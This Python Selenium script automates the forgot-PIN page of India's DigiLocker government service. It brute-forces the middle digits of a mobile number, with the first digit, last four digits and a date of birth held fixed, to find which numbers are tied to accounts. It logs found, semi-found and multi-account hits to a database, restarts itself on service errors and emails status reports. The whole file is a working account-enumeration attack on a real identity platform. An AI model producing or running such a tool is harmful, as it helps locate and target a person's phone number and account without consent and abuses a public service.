import selenium
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.remote.webelement import WebElement


import time
from datetime import datetime
import urllib3, requests
import traceback
import subprocess

from email.message import EmailMessage
import smtplib
from dotenv import load_dotenv
import os

load_dotenv()
from digilocker import models

class DigiLockerAutomationUpdated:

    def __init__(self):
        self.first_number = "9"
        self.last_four_digits = "4325"
        
        chrome_options = Options()
        chrome_options.add_argument("--headless")  # Essential for servers
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")

        chrome_service = Service(executable_path=ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=chrome_service, options=chrome_options)
        self.url = "https://digilocker.meripehchaan.gov.in/signin/forgot_pin"

        self.driver.set_window_position(x=350,y=10)
        self.driver.get(self.url)

        self.day = os.environ.get("DAY")
        self.month = os.environ.get("MONTH")
        self.year = os.environ.get("YEAR")
    
    def find_phone_number(self):
        
        Select(self.driver.find_element(By.XPATH, "//select[@id='types']")).select_by_value("mobile")
        time.sleep(1)

        self.is_OTP_found = False

        # with open(r"D:\digi locker\last_checked_number_updated.txt", "r") as f:
        #     last_checked_number = f.read().strip()
        last_checked_number = models.last_checked_number.objects.last().text.strip()

        if last_checked_number[0] != self.first_number:
            print(f"Completed the Number Series {self.first_number}")
            self.driver.quit()
            return "completed"
        
        # Build the full phone number
        self.full_phone_number = str(int(last_checked_number) + 1) + self.last_four_digits
        obj = models.running_status.objects.last()
        obj.is_running = True
        obj.save()

        print("Trying phone number:", self.full_phone_number)

        phone_input = self.driver.find_element(By.ID, 'validateinput')
        phone_input.click()
        time.sleep(0.1)

        for each_number in self.full_phone_number:
            phone_input.send_keys(each_number)
            time.sleep(0.05)
        

        # self.driver.save_screenshot(r"D:\digi locker\selenium_digi_locker1_updated.png")


        self.driver.find_element(By.ID, "dd").send_keys(self.day)
        time.sleep(0.1)
        self.driver.find_element(By.ID, "mm").send_keys(self.month)
        time.sleep(0.1)
        self.driver.find_element(By.ID, "yy").send_keys(self.year)
        time.sleep(0.1)

        self.submit_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
        self.submit_button.click()
        time.sleep(0.5)

        return self.check_for_alerts(full_phone_number=self.full_phone_number)
    
    def check_for_alerts(self,full_phone_number):
        global dob
        
        error_xpaths_list = ["//div[@id='mobile_accounts_section']", "//div[@id='errorAlert']"]
        # ["//div[@id='mobile_accounts_section']", "//div[@id='errorAlert']"]

        try:
            visible_element:list[WebElement] = WebDriverWait(self.driver, 5).until(EC.visibility_of_any_elements_located((By.XPATH, "|".join(error_xpaths_list))))
            alert_message = visible_element[0].text.strip()

        except Exception as e:

            try:
                WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".alert-success")))
                success_message = self.driver.find_element(By.CSS_SELECTOR, ".alert-success").text.strip()
                self.driver.find_element(By.CSS_SELECTOR,".alert-success")
                self.is_OTP_found = True
            except:
                return "error"
        
        if self.is_OTP_found:
            print(f"OTP found for phone number: {full_phone_number}")
            
            # with open(r"D:\digi locker\found_automatic_updated.txt", "a") as f:
            #     f.write(full_phone_number + " " + str(datetime.now()) + "\n")
            models.found_automatic.objects.create(text=f"{full_phone_number}  {str(datetime.now())}").save()
            
            image_save_path = r"D:\digi locker\automatic_found_images_updated\{}.png".format(full_phone_number)
            # self.driver.save_screenshot(filename=image_save_path)

            dob = self.day + "/" + self.month + "/" + self.year

            # with open(r"D:\digi locker\last_checked_number_updated.txt", "w") as f:
            #     f.write(full_phone_number[:6])
            models.last_checked_number.objects.create(text=full_phone_number[:6]).save()

            return "found"
        
        """
        general_messages = ["Please enter correct date of birth",
                            "This Mobile number is not associated with any account",
                            "Mobile number verification service unavailable"]
        """
        dob = d.driver.find_element(By.ID,'dd').get_attribute('value') + '/' + d.driver.find_element(By.ID,'mm').get_attribute('value') + '/' + d.driver.find_element(By.ID,'yy').get_attribute('value')

        if "This Mobile number is not associated with any account" in alert_message:
            return "not found"
        
        elif "multiple accounts" in alert_message:
        
            # with open(r"D:\digi locker\multiuser_updated.txt", "a") as f:
            #     f.write(full_phone_number + "\n")
            models.multi_user.objects.create(text=full_phone_number).save()

            # self.driver.find_element(By.NAME, "username").click()
            # time.sleep(0.5)
            # self.driver.find_element(By.XPATH, "//button[@type='submit']").click()
            # time.sleep(0.5)
            # return self.check_for_alerts(full_phone_number=full_phone_number) + "multiple-times"

            return "not found"
        
        elif "Please enter correct date of birth" in alert_message:
            # with open(r"D:\digi locker\semi_found_updated.txt", "a") as f:
            #     f.write(full_phone_number + "\n")

            models.semi_found.objects.create(text=full_phone_number).save()

            return "not found"
        
        elif "Enter a valid mobile number" in alert_message:

            # with open(r"D:\digi locker\not_valid_mobile_number.txt","a") as f:
            #     f.write(full_phone_number + "\n")

            models.not_a_valid_number.objects.create(text=full_phone_number).save()

            return "not found"
        
        elif "Mobile number verification service unavailable" in alert_message:
            print("Service Unavailable. Retrying...")
            alert_message = "Service Unavailable - Restarting Script"
            # d.driver.save_screenshot(r"D:\digi locker\errors_updated\{}.png".format(date_time))
    
            # with open(r"D:\digi locker\errors_updated\error_log_updated.txt",'a') as f:
            #     f.write(f"{date_time} - {full_phone_number} - {alert_message}\n")

            models.error.objects.create(text=f"{date_time} - {full_phone_number} - {alert_message}")

            return "service_unavailable"
            
        
        else:
            print(f"Unexpected alert message: {alert_message}")

            date_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
            # self.driver.save_screenshot(r"D:\digi locker\errors_updated\{}.png".format(date_time))

            # with open(r"D:\digi locker\errors_updated\error_log_updated.txt",'a') as f:
            #     f.write(f"{date_time} - {full_phone_number} - {alert_message}\n")

            models.error.objects.create(text=f"{date_time} - {full_phone_number} - {alert_message}").save()

            __class__.send_gmail(f"Unexcepted alert message: {alert_message}")

            return "error"

    def send_gmail(self,message:str):

        sendermail = os.environ.get("SENDER_MAIL")
        password = os.environ.get("MAIL_PASSWORD")
        recivermail= os.environ.get("RECEIVER_MAIL")

        new_mail = EmailMessage()
        new_mail['Subject'] = "This is bot messaging from pythonanywhere."
        new_mail["From"] = sendermail
        new_mail['To'] = recivermail
        new_mail.set_content(message)

        with smtplib.SMTP_SSL(host='smtp.gmail.com',port=465) as server:
            server.login(user=sendermail,password=password)
            server.send_message(new_mail)
            server.quit()
        

script_path = __file__
dob = None # for the valid dob entered or not

def run_script():
    global d
    from datetime import datetime
    try:
        d = DigiLockerAutomationUpdated()
        should_restart = True

        while True:
            output = d.find_phone_number()

            if output == "completed" or output == "error":
                should_restart = False
                break
            
            elif output == "service_unavailable":
                print(output)
                d.driver.quit() # Close the current driver

                time.sleep(2)
                subprocess.run(["python", script_path])
                break

            # with open(r"D:\digi locker\last_checked_number_updated.txt", "w") as f:
            #     f.write(f"{d.full_phone_number[:6]}")
            models.last_checked_number.objects.create(text=d.full_phone_number[:6]).save()
            
            # with open(r"D:\digi locker\completed_updated.txt",'a') as f:
            #     f.write(f"{d.full_phone_number} - updated - {str(datetime.now())} - {dob} - pythonanywhere\n")
            models.completed.objects.create(text=f"{d.full_phone_number} - updated - {str(datetime.now())} - {dob} - pythonanywhere").save()

            if "multiple-times" in output:
                d.driver.back()
                d.driver.back()

                d.driver.refresh()
                time.sleep(1)

            else:
                d.driver.back()
                d.driver.refresh()
                time.sleep(1)

            
    except requests.exceptions.ConnectionError:
        print("Bad Internet Connection")
        print(datetime.now())
        should_restart = False

    except urllib3.exceptions.MaxRetryError:
        print("Lost internet Connection")
        print(datetime.now())
        should_restart = False

    except Exception as e:
        print(traceback.format_exc())
        print(datetime.now())
        should_restart = False

        d.send_gmail("Unknowexceprion in main block")
    
    finally:
        if should_restart:
            print("script restating")
            time.sleep(1)
            subprocess.Popen(["python", script_path])
            d.driver.quit()

        obj = models.running_status.objects.last()
        obj.is_running = False
        obj.save()
        print(models.running_status.objects.last())

        time.sleep(0.5)
        d.send_gmail("Scripted ended")
        d.driver.quit()

        
